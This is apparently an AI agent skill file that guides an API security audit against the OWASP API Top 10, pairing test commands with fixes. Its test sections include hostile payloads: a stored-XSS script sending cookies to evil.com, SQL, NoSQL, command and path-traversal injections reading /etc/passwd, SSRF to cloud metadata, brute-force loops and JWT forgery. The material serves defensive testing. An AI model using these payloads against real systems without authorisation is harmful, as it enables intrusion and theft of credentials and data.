---
name: api-audit
description: "Use when the user says 'audit API', 'check API security', 'API security review', 'endpoint audit', 'check my routes', 'BOLA check', 'IDOR check', 'API pentest', or needs to verify API route protection, authentication, authorization, input validation, or rate limiting. Do NOT use for frontend security headers (see csp-headers), dependency scanning (see dependency-audit), or database RLS policies (see rls-checker)."
---

# 🛡️ API Audit — Comprehensive API Security Assessment
*Systematically audit API endpoints for authentication flaws, authorization bypasses, injection vulnerabilities, data exposure, and misconfigurations mapped to the OWASP API Security Top 10.*

## Activation

When this skill activates, output:

`🛡️ API Audit — Scanning API attack surface...`

| Context | Status |
|---------|--------|
| **User says "audit API", "check API security", "endpoint audit"** | ACTIVE |
| **User wants to find BOLA/IDOR vulnerabilities** | ACTIVE |
| **User asks about JWT security, rate limiting, or CORS** | ACTIVE |
| **User needs API penetration testing guidance** | ACTIVE |
| **User wants CSP or browser security headers** | DORMANT — see csp-headers |
| **User wants dependency vulnerability scanning** | DORMANT — see dependency-audit |
| **User wants database row-level security** | DORMANT — see rls-checker |

## Protocol

### Step 1: Gather Inputs

Ask the user for:
- **API type**: REST, GraphQL, gRPC, WebSocket, or mixed?
- **Framework**: Express, FastAPI, Next.js API routes, Django REST, Rails, Go net/http, etc.?
- **Authentication method**: JWT, session cookies, API keys, OAuth2, or none?
- **Authorization model**: RBAC, ABAC, resource ownership, or ad-hoc checks?
- **API documentation**: OpenAPI/Swagger spec available? Postman collection?
- **Deployment context**: Public internet, internal microservice, or hybrid?
- **Known concerns**: Any specific endpoints or patterns you're worried about?

### Step 2: Enumerate Attack Surface

Build a complete endpoint inventory:

```
── ENDPOINT INVENTORY ────────────────────

Method  Path                        Auth Required  Roles        Input Sources
GET     /api/users                  Yes            admin        query params
GET     /api/users/:id              Yes            admin, self  path param
POST    /api/users                  Yes            admin        JSON body
PUT     /api/users/:id              Yes            admin, self  path param + JSON body
DELETE  /api/users/:id              Yes            admin        path param
POST    /api/auth/login             No             —            JSON body
POST    /api/auth/register          No             —            JSON body
POST    /api/auth/reset-password    No             —            JSON body
GET     /api/files/:id/download     Yes            owner        path param
POST    /api/webhooks/stripe        No*            —            JSON body (*signature verified)
GET     /api/health                 No             —            none
```

**Discovery commands:**

For Express/Node.js:
```bash
# Extract routes from Express app
grep -rn "router\.\(get\|post\|put\|patch\|delete\)\|app\.\(get\|post\|put\|patch\|delete\)" --include="*.js" --include="*.ts" src/

# Next.js API routes
find pages/api -name "*.ts" -o -name "*.js" | sort
find app/api -name "route.ts" -o -name "route.js" | sort
```

For FastAPI/Python:
```bash
# Extract FastAPI routes
grep -rn "@app\.\(get\|post\|put\|patch\|delete\)\|@router\.\(get\|post\|put\|patch\|delete\)" --include="*.py" src/
```

For OpenAPI spec:
```bash
# List all paths from OpenAPI spec
cat openapi.json | jq '.paths | keys[]'
# Or with yq for YAML
yq '.paths | keys' openapi.yaml
```

### Step 3: OWASP API Security Top 10 (2023) Audit

Assess each endpoint against all 10 categories:

#### API1:2023 — Broken Object Level Authorization (BOLA/IDOR)

The most critical and common API vulnerability. Occurs when an API endpoint accepts an object identifier and does not verify the requester has permission to access that specific object.

**Detection method:**

```bash
# Step 1: Authenticate as User A, get their resource
curl -s -H "Authorization: Bearer $TOKEN_USER_A" \
  https://api.example.com/api/users/101/orders | jq '.orders[0].id'
# Returns: order_501

# Step 2: Try to access User B's resource with User A's token
curl -s -H "Authorization: Bearer $TOKEN_USER_A" \
  https://api.example.com/api/users/102/orders
# VULNERABLE if this returns User B's orders

# Step 3: Try sequential ID enumeration
for id in $(seq 100 110); do
  echo "=== User $id ==="
  curl -s -H "Authorization: Bearer $TOKEN_USER_A" \
    https://api.example.com/api/users/$id/profile | jq '.email'
done
```

**Vulnerable pattern (Node.js/Express):**
```javascript
// BAD — no ownership check
app.get('/api/orders/:orderId', authenticate, async (req, res) => {
  const order = await Order.findById(req.params.orderId);
  res.json(order); // Anyone authenticated can view ANY order
});
```

**Fixed pattern:**
```javascript
// GOOD — ownership verified
app.get('/api/orders/:orderId', authenticate, async (req, res) => {
  const order = await Order.findOne({
    _id: req.params.orderId,
    userId: req.user.id  // Scoped to authenticated user
  });
  if (!order) return res.status(404).json({ error: 'Not found' });
  res.json(order);
});
```

**Checklist:**
- [ ] Every endpoint with an ID parameter checks ownership or role
- [ ] UUIDs used instead of sequential integers for resource IDs
- [ ] Bulk endpoints filter by user context
- [ ] GraphQL nested resolvers check authorization at each level
- [ ] No reliance on client-supplied user ID (use token-derived identity)

#### API2:2023 — Broken Authentication

**Testing commands:**

```bash
# Test for missing rate limiting on login
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://api.example.com/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@example.com","password":"attempt'$i'"}'
  echo " attempt $i"
done

# Test JWT without signature verification (alg:none attack)
# Decode existing JWT
echo "$JWT_TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq .

# Test for JWT key confusion (RS256 -> HS256)
# If server uses RS256, try signing with HS256 using the public key
python3 -c "
import jwt, json
payload = {'sub': 'admin', 'role': 'admin', 'exp': 9999999999}
# Attempt HS256 with public key (should be rejected)
token = jwt.encode(payload, open('public.pem').read(), algorithm='HS256')
print(token)
"

# Test password reset token entropy
for i in $(seq 1 5); do
  curl -s -X POST https://api.example.com/api/auth/reset-password \
    -H "Content-Type: application/json" \
    -d '{"email":"test@example.com"}' | jq '.token'
done
# Check: Are tokens sequential? Low entropy? Predictable?
```

**JWT Security Checklist:**
- [ ] Algorithm explicitly set server-side (never trust header `alg`)
- [ ] Tokens expire (short-lived: 15min access, 7d refresh)
- [ ] Refresh token rotation implemented
- [ ] JWTs not stored in localStorage (use httpOnly cookies)
- [ ] Token revocation mechanism exists (blacklist or short expiry)
- [ ] `kid` header validated against known key IDs
- [ ] `iss` and `aud` claims validated
- [ ] No sensitive data in JWT payload (it's base64, not encrypted)

#### API3:2023 — Broken Object Property Level Authorization

**Detection — check for mass assignment and excessive data exposure:**

```bash
# Test excessive data exposure — does the response include fields it shouldn't?
curl -s -H "Authorization: Bearer $TOKEN_REGULAR_USER" \
  https://api.example.com/api/users/me | jq 'keys'
# VULNERABLE if response includes: passwordHash, ssn, internalNotes, isAdmin

# Test mass assignment — can you set fields you shouldn't?
curl -s -X PUT -H "Authorization: Bearer $TOKEN_REGULAR_USER" \
  -H "Content-Type: application/json" \
  https://api.example.com/api/users/me \
  -d '{"name":"Normal Update","role":"admin","isVerified":true}'
# VULNERABLE if role or isVerified actually changed
```

**Vulnerable pattern:**
```javascript
// BAD — returns full database object
app.get('/api/users/:id', authenticate, async (req, res) => {
  const user = await User.findById(req.params.id);
  res.json(user); // Exposes passwordHash, internalNotes, etc.
});

// BAD — mass assignment
app.put('/api/users/:id', authenticate, async (req, res) => {
  await User.findByIdAndUpdate(req.params.id, req.body); // User can set ANY field
});
```

**Fixed pattern:**
```javascript
// GOOD — explicit field selection (allowlist)
app.get('/api/users/:id', authenticate, async (req, res) => {
  const user = await User.findById(req.params.id)
    .select('name email avatar createdAt');  // Only public fields
  res.json(user);
});

// GOOD — explicit field allowlist for updates
app.put('/api/users/:id', authenticate, async (req, res) => {
  const allowed = ['name', 'email', 'avatar'];
  const updates = Object.keys(req.body)
    .filter(key => allowed.includes(key))
    .reduce((obj, key) => ({ ...obj, [key]: req.body[key] }), {});
  await User.findByIdAndUpdate(req.params.id, updates);
});
```

#### API4:2023 — Unrestricted Resource Consumption

**Testing:**

```bash
# Test rate limiting
for i in $(seq 1 200); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN" \
    https://api.example.com/api/search?q=test)
  echo "Request $i: $STATUS"
  if [ "$STATUS" = "429" ]; then
    echo "Rate limited at request $i"
    break
  fi
done

# Test large payload acceptance
python3 -c "print('{\"data\":' + '\"A\"*10000000' + '}')" | \
  curl -s -o /dev/null -w "%{http_code}" \
    -X POST -H "Content-Type: application/json" \
    -d @- https://api.example.com/api/upload

# Test pagination abuse
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.example.com/api/users?limit=999999&offset=0" | jq '.data | length'

# GraphQL complexity attack
curl -s -X POST -H "Content-Type: application/json" \
  https://api.example.com/graphql \
  -d '{"query":"{ users { friends { friends { friends { friends { name }}}}}}"}'
```

**Rate limiting implementation (Express):**
```javascript
import rateLimit from 'express-rate-limit';

// General API rate limit
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many requests, try again later' }
});

// Strict limit for auth endpoints
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  skipSuccessfulRequests: true, // Only count failures
});

app.use('/api/', apiLimiter);
app.use('/api/auth/login', authLimiter);
app.use('/api/auth/reset-password', authLimiter);
```

#### API5:2023 — Broken Function Level Authorization

**Detection:**

```bash
# Test admin endpoints with regular user token
ADMIN_ENDPOINTS=(
  "GET /api/admin/users"
  "POST /api/admin/config"
  "DELETE /api/users/101"
  "PUT /api/users/101/role"
  "GET /api/internal/metrics"
  "POST /api/users/101/impersonate"
)

for endpoint in "${ADMIN_ENDPOINTS[@]}"; do
  METHOD=$(echo $endpoint | cut -d' ' -f1)
  PATH=$(echo $endpoint | cut -d' ' -f2)
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -X $METHOD -H "Authorization: Bearer $TOKEN_REGULAR_USER" \
    "https://api.example.com$PATH")
  echo "$endpoint -> $STATUS"
  # Should be 401 or 403, NOT 200
done

# Test HTTP method override
curl -s -X POST -H "X-HTTP-Method-Override: DELETE" \
  -H "Authorization: Bearer $TOKEN_REGULAR_USER" \
  https://api.example.com/api/users/101
```

#### API6:2023 — Unrestricted Access to Sensitive Business Flows

**Check for:**
- [ ] Purchase/checkout endpoints protected against automated abuse
- [ ] Registration endpoints have CAPTCHA or equivalent
- [ ] Comment/review endpoints prevent spam
- [ ] Referral/reward endpoints prevent self-referral loops
- [ ] Export endpoints prevent bulk data scraping

#### API7:2023 — Server Side Request Forgery (SSRF)

```bash
# Test URL parameters for SSRF
# Try internal network access
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.example.com/api/fetch-url?url=http://169.254.169.254/latest/meta-data/"

# Try localhost access
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.example.com/api/fetch-url?url=http://localhost:6379/"

# Try DNS rebinding
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.example.com/api/fetch-url?url=http://7f000001.nip.io/"
```

#### API8:2023 — Security Misconfiguration

```bash
# Check CORS configuration
curl -s -I -H "Origin: https://evil.com" \
  https://api.example.com/api/users | grep -i "access-control"
# VULNERABLE if Access-Control-Allow-Origin: * or reflects any origin

# Check for debug/stack traces
curl -s -X POST https://api.example.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"invalid": "deliberately malformed"}' | jq .
# VULNERABLE if response includes stack traces, file paths, or SQL queries

# Check for unnecessary HTTP methods
curl -s -X OPTIONS https://api.example.com/api/users \
  -I | grep -i "allow"

# Check for default credentials on admin panels
curl -s -X POST https://api.example.com/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@example.com","password":"admin"}'
```

#### API9:2023 — Improper Inventory Management

**Checklist:**
- [ ] No old API versions still accessible (v1 when v3 is current)
- [ ] No undocumented endpoints exposed
- [ ] No debug/test endpoints in production
- [ ] API gateway routes match documentation
- [ ] Deprecated endpoints return appropriate warnings

```bash
# Discover undocumented endpoints
COMMON_PATHS=(
  "/api/debug" "/api/test" "/api/internal" "/api/admin"
  "/api/v1" "/api/v2" "/api/graphql" "/api/graphiql"
  "/api/swagger" "/api/docs" "/api/health" "/api/metrics"
  "/api/config" "/api/env" "/api/info" "/api/status"
)

for path in "${COMMON_PATHS[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://api.example.com$path")
  if [ "$STATUS" != "404" ]; then
    echo "FOUND: $path -> $STATUS"
  fi
done
```

#### API10:2023 — Unsafe Consumption of APIs

**Checklist:**
- [ ] Third-party API responses are validated before use
- [ ] Webhook payloads are signature-verified
- [ ] Redirects from external APIs are not blindly followed
- [ ] Timeouts set for all external API calls
- [ ] External API data is sanitized before storage/display

### Step 4: Input Validation Deep Dive

Test every input vector:

```bash
# SQL Injection
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.example.com/api/users?search=admin'%20OR%201=1--"

# NoSQL Injection
curl -s -X POST -H "Content-Type: application/json" \
  https://api.example.com/api/auth/login \
  -d '{"email":{"$gt":""},"password":{"$gt":""}}'

# XSS via API (stored XSS)
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  https://api.example.com/api/comments \
  -d '{"body":"<script>fetch(\"https://evil.com/steal?c=\"+document.cookie)</script>"}'

# Path traversal
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.example.com/api/files/..%2F..%2Fetc%2Fpasswd"

# Command injection
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.example.com/api/tools/ping?host=google.com;cat%20/etc/passwd"

# Prototype pollution (Node.js)
curl -s -X PUT -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  https://api.example.com/api/settings \
  -d '{"__proto__":{"isAdmin":true}}'
```

**Input validation implementation:**
```javascript
import { z } from 'zod';

// Define strict schemas for every endpoint
const CreateUserSchema = z.object({
  name: z.string().min(1).max(100).regex(/^[a-zA-Z\s'-]+$/),
  email: z.string().email().max(254),
  password: z.string().min(12).max(128),
  role: z.enum(['user', 'editor']),  // Never allow 'admin' via API
}).strict();  // Reject unknown fields

// Validation middleware
function validate(schema) {
  return (req, res, next) => {
    const result = schema.safeParse(req.body);
    if (!result.success) {
      return res.status(400).json({
        error: 'Validation failed',
        details: result.error.issues.map(i => ({
          field: i.path.join('.'),
          message: i.message
        }))
      });
    }
    req.validated = result.data;
    next();
  };
}

app.post('/api/users', authenticate, authorize('admin'), validate(CreateUserSchema),
  async (req, res) => {
    const user = await User.create(req.validated); // Use validated data only
    res.status(201).json(pick(user, ['id', 'name', 'email', 'role']));
  }
);
```

### Step 5: CORS Configuration Audit

```bash
# Test with various origins
ORIGINS=("https://evil.com" "null" "https://api.example.com.evil.com" "http://localhost:3000")

for origin in "${ORIGINS[@]}"; do
  echo "=== Origin: $origin ==="
  curl -s -I -H "Origin: $origin" \
    https://api.example.com/api/users 2>/dev/null | grep -i "access-control"
  echo ""
done
```

**Secure CORS configuration (Express):**
```javascript
import cors from 'cors';

const allowedOrigins = [
  'https://app.example.com',
  'https://admin.example.com',
];

// Only add localhost in development
if (process.env.NODE_ENV === 'development') {
  allowedOrigins.push('http://localhost:3000');
}

app.use(cors({
  origin: (origin, callback) => {
    // Allow requests with no origin (server-to-server, curl)
    if (!origin) return callback(null, true);
    if (allowedOrigins.includes(origin)) {
      return callback(null, true);
    }
    callback(new Error('CORS policy violation'));
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 86400, // Cache preflight for 24 hours
}));
```

### Step 6: Severity Classification

Use this decision tree to classify findings:

```
Finding Severity Decision Tree:

Does the vulnerability allow unauthorized access to other users' data?
├── YES → Can the attacker modify or delete data?
│   ├── YES → CRITICAL
│   └── NO (read-only) → Is the data sensitive (PII, financial, health)?
│       ├── YES → CRITICAL
│       └── NO → HIGH
├── NO → Does it allow privilege escalation?
│   ├── YES → CRITICAL
│   └── NO → Does it allow denial of service?
│       ├── YES → Is it easy to exploit?
│       │   ├── YES → HIGH
│       │   └── NO → MEDIUM
│       └── NO → Does it leak internal information?
│           ├── YES → Is it exploitable externally?
│           │   ├── YES → MEDIUM
│           │   └── NO → LOW
│           └── NO → INFORMATIONAL
```

| Severity | CVSS Range | Response Time | Examples |
|----------|-----------|---------------|----------|
| **CRITICAL** | 9.0-10.0 | Fix immediately | BOLA on sensitive data, auth bypass, SQL injection |
| **HIGH** | 7.0-8.9 | Fix within 48h | Broken auth, privilege escalation, SSRF to internal |
| **MEDIUM** | 4.0-6.9 | Fix within 1 week | Missing rate limiting, verbose errors, weak CORS |
| **LOW** | 0.1-3.9 | Fix within 1 month | Information disclosure, missing headers |
| **INFO** | 0.0 | Track | Best practice deviations |

### Step 7: Generate Report

```
━━━ API SECURITY AUDIT REPORT ━━━━━━━━━━━━

── SUMMARY ────────────────────────────────
Target: [API name / base URL]
Date: [audit date]
Scope: [endpoint count] endpoints audited
Auth Method: [JWT / session / API key]

── FINDINGS ───────────────────────────────
CRITICAL: [count]
HIGH:     [count]
MEDIUM:   [count]
LOW:      [count]
INFO:     [count]

── CRITICAL FINDINGS ──────────────────────
[ID] [Title]
  Category: [OWASP API category]
  Endpoint: [METHOD /path]
  Description: [what's wrong]
  Evidence: [curl command + response showing vulnerability]
  Impact: [what an attacker could do]
  Remediation: [specific fix with code example]

── REMEDIATION PRIORITY ───────────────────
1. [Critical finding] — fix immediately
2. [Critical finding] — fix immediately
3. [High finding] — fix within 48h
...

── ARCHITECTURE RECOMMENDATIONS ───────────
[Strategic improvements beyond individual fixes]
```

## Anti-Patterns

| Anti-Pattern | Why It's Wrong | Correct Approach |
|-------------|----------------|------------------|
| Checking authorization only in the frontend | Attackers bypass the frontend entirely | Enforce authz at the API layer |
| Using sequential integer IDs in URLs | Enables enumeration attacks | Use UUIDs or non-guessable identifiers |
| Returning full database objects | Leaks internal fields | Explicit field allowlists per endpoint |
| Single rate limit for all endpoints | Auth endpoints need much stricter limits | Tiered rate limiting by sensitivity |
| CORS `Access-Control-Allow-Origin: *` with credentials | Allows any origin to make authenticated requests | Explicit origin allowlist |
| Trusting the JWT `alg` header | Enables algorithm confusion attacks | Pin algorithm server-side |
| Logging full request/response bodies | May log passwords, tokens, PII | Log metadata only, redact sensitive fields |
| Using API keys as sole authentication | API keys are long-lived and easily leaked | API keys + short-lived tokens for user context |

## Escalation

Hand off to a human security professional when:
- You discover active exploitation (compromised tokens, data exfiltration in logs)
- The API handles payment processing, health data, or legal documents (compliance requirements)
- You find vulnerabilities in third-party APIs you don't control
- The fix requires significant architectural changes (e.g., adding an API gateway)
- You need to perform authenticated testing against production (requires explicit authorization)
- Cryptographic implementation review is needed (custom token signing, encryption)

## Inputs
- API endpoint inventory (routes, methods, auth requirements)
- Authentication mechanism details (JWT config, session setup, API key scheme)
- Authorization model description (roles, permissions, ownership rules)
- OpenAPI/Swagger spec if available
- Framework and language stack
- Deployment context (public, internal, hybrid)

## Outputs
- Complete endpoint inventory with auth/authz mapping
- OWASP API Top 10 assessment with per-category findings
- Severity-classified vulnerability list with evidence
- Reproducible test commands (curl/httpie) for each finding
- Code-level remediation examples for each vulnerability
- CORS configuration audit results
- Input validation gap analysis
- Prioritized remediation roadmap
- Architecture improvement recommendations
